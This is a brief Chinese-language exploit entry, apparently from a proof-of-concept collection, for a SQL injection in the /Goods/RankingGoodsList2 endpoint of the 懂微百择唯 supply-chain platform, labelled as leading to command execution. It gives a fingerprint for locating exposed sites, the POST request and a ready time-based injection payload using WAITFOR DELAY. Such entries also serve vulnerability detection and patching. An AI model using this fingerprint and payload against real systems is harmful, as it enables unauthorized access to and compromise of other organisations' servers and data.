# 懂微百择唯·供应链RankingGoodsList2SQL注入致RCE漏洞

懂微百择唯·供应链RankingGoodsList2SQL注入致 ｜ 命令执行 ｜ —
- **指纹**：`body="/Content/Css/_SiteCss/"`
- **请求**：`POST /Goods/RankingGoodsList2 HTTP/1.1`

**Payload**
```
goodsSortType=Recommend&goodsTypeList%5B%5D=1%';WAITFOR DELAY '0:0:5'--
```
- **响应特征**：200